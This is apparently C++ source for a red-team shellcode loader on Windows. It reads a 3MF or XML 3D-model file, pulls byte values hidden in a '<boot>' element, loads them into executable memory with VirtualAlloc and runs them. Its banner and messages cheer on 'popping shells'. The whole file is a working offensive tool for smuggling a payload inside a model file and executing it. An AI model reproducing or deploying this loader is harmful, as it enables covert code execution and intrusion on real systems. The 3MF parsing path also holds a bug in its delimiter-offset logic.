#include <iostream>
#include <fstream>
#include <sstream>
#include "tinyxml2.h"
#include <iomanip>
#include <vector>
#include <string>
#include <windows.h>

using namespace std;
using namespace tinyxml2;

#define OBJ_EXCLUSIVE 0x00000020L

vector<unsigned char> intToBytes(int paramInt)
{
	vector<unsigned char> arrayOfByte(4);
	for (int i = 0; i < 4; i++)
		arrayOfByte[3 - i] = (paramInt >> (i * 8));
	return arrayOfByte;
}

void runme(vector<unsigned char> ExecCode, size_t CodeSize) {
	std::cout << "[+] Executing payload with no OPSEC";
	Sleep(500);
	std::cout << ".";
	Sleep(500);
	std::cout << ".";
	Sleep(500);
	std::cout << ".";
	Sleep(500);
	std::cout << "RIP" << endl;
	void* exec = VirtualAlloc(0, CodeSize, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(exec, ExecCode.data(), CodeSize);
	((void(*)())exec)();

}

int run3MF(char* file, bool OPSEC) {
	tinyxml2::XMLDocument xml_doc;

	ifstream zippy(file, ios::binary);
	if (zippy.is_open()) {
		std::cout << "[+] 3mf opened!" << endl;

		string findbegstr = "<boot>";
		string findendstr = "</boot>";


		std::cout << "[+] Loading and Converting Shellcode..." << endl;


		std::ostringstream zipStream;
		zipStream << zippy.rdbuf();
		std::string zipstr = zipStream.str();
		size_t startingpoint = zipstr.find(findbegstr);
		if (startingpoint == std::string::npos) {
			std::cerr << "Start delimiter not found in the file." << std::endl;
			exit(0);
		}

		size_t endingpoint = zipstr.find(findendstr, startingpoint);
		if (endingpoint == std::string::npos) {
			std::cerr << "End delimiter not found in the file." << std::endl;
			exit(0);
		}
		endingpoint = findendstr.length();

		std::string xmlcodeblock = zipstr.substr(startingpoint, endingpoint-startingpoint);

		vector<unsigned char> zipXML;

		auto parseXML = xml_doc.Parse((const char*)xmlcodeblock.data());
		if (parseXML == XML_SUCCESS) {
			std::cout << "[+] Good XML found!" << endl;
			XMLElement* pRootElement = xml_doc.RootElement();
			for (const XMLElement* child = pRootElement->FirstChildElement(); child != 0; child = child->NextSiblingElement()) {
				for (const XMLAttribute* a = child->FirstAttribute(); a; a = a->Next()) {
					const char* j = a->Value();
					if (std::strchr(j, '-')) {
						continue;
					}
					int i = atoi(j);
					zipXML.push_back(i);
				}
			}

			runme(zipXML, zipXML.size());

			return 0;
		}
		else {
			std::cout << "[-] You're XML is no good, Try Again!" << endl;
			exit(0);
		}
		zippy.close();
	}
	return 0;
}

int run3DMODEL(char* file, bool OPSEC) {

	tinyxml2::XMLDocument xml_doc;
	tinyxml2::XMLError eResult = xml_doc.LoadFile(file);

	vector<unsigned char> sc;

	if (eResult != tinyxml2::XML_SUCCESS) {
		std::cout << "[-] Could not load your file," << endl;
		std::cout << "[d-.-b] Red Team Wsisdom: Check thyself beforan thine wreck thyself." <<endl;
		return false;
	}
	else {
		XMLElement* pRootElement = xml_doc.RootElement();
		std::cout << "[+] Found Valid XML File!!!" << endl;
		std::cout << "[+] Loading and Converting Shellcode..." << endl;
		if (NULL != pRootElement) {

				for (const XMLElement* child = pRootElement->FirstChildElement(); child != 0; child = child->NextSiblingElement()) {
					for (const XMLElement* subchild = child->FirstChildElement(); subchild != 0; subchild = subchild->NextSiblingElement()) {
						if (subchild->FirstChildElement("boot")) {
							std::cout << "[+] Hokey Smokes it's our code!" << endl;
							for (const XMLElement* vert = subchild->FirstChildElement("boot")->FirstChildElement(); vert != 0; vert = vert->NextSiblingElement()) {
								for (const XMLAttribute* a = vert->FirstAttribute(); a; a = a->Next()) {
									const char* j = a->Value();
									int i = atoi(j);
									sc.push_back(i);
								}
							}
						}
					}
				}
		}
		if (sc.size() == 0) {
			std::cout << "[+] whoopsie" << endl;
			exit(0);
		}

		runme(sc, sc.size());
	}
}

int main(int argc, char* argv[]) {


	std::cout << R"(                                                                                                                                                    
        ,--,                                                                                                      .--,-``-.                         
      ,--.'|                           ,-.                                                                       /   /     '.      ,---,            
   ,--,  | :                       ,--/ /|   ,--,                                    ,--,                       / ../        ;   .'  .' `\          
,---.'|  : '                     ,--. :/ | ,--.'|         ,---,                    ,--.'|         ,---,         \ ``\  .`-    ',---.'     \         
|   | : _' |                     :  : ' /  |  |,      ,-+-. /  |  ,----._,.        |  |,      ,-+-. /  |         \___\/   \   :|   |  .`\  |        
:   : |.'  |  ,--.--.     ,---.  |  '  /   `--'_     ,--.'|'   | /   /  ' /        `--'_     ,--.'|'   |              \   :   |:   : |  '  |        
|   ' '  ; : /       \   /     \ '  |  :   ,' ,'|   |   |  ,"' ||   :     |        ,' ,'|   |   |  ,"' |              /  /   / |   ' '  ;  :        
'   |  .'. |.--.  .-. | /    / ' |  |   \  '  | |   |   | /  | ||   | .\  .        '  | |   |   | /  | |              \  \   \ '   | ;  .  |        
|   | :  | ' \__\/: . ..    ' /  '  : |. \ |  | :   |   | |  | |.   ; ';  |        |  | :   |   | |  | |          ___ /   :   ||   | :  |  '        
'   : |  : ; ," .--.; |'   ; :__ |  | ' \ \'  : |__ |   | |  |/ '   .   . |        '  : |__ |   | |  |/          /   /\   /   :'   : | /  ;         
|   | '  ,/ /  /  ,.  |'   | '.'|'  : |--' |  | '.'||   | |--'   `---`-'| |        |  | '.'||   | |--'          / ,,/  ',-    .|   | '` ,/          
;   : ;--' ;  :   .'   \   :    :;  |,'    ;  :    ;|   |/       .'__/\_: |        ;  :    ;|   |/              \ ''\        ; ;   :  .'            
|   ,/     |  ,     .-./\   \  / '--'      |  ,   / '---'        |   :    :        |  ,   / '---'                \   \     .'  |   ,.'              
'---'       `--`---'     `----'             ---`-'                \   \  /          ---`-'                        `--`-,,-'    '---'                
                                                                   `--`-'                                                                           )";
	std::cout << endl;
	std::cout << endl;

	bool OPSEC = false;

	string file = argv[1];

	if (argc > 2){
		std::cout << "Easy captiain! You only need one argument." << std::endl;
	}
	

	if((file.substr(file.find_last_of(".") + 1) == "3mf")){
		std::cout << "[+] We've got a 3D object file .3mf" << endl;
		run3MF(argv[1],OPSEC);
	}

	if ((file.substr(file.find_last_of(".") + 1) == "model") || (file.substr(file.find_last_of(".") + 1) == "xml")) {
		std::cout << "[+] opening 3dmodel as raw XML" << endl;
		run3DMODEL(argv[1],OPSEC);
	}

	std::cout << endl;
	std::cout << endl;
	std::cout << "<(..<) Hopefully You Popped Them Shells!" << endl;
	std::cout << "(>..)> Happy Hacking!";
	std::cout << " <(o.o)> All Done!" << endl;
	std::cout << endl;

	std::cout << "         d-.-b" << endl;
	return 0;
}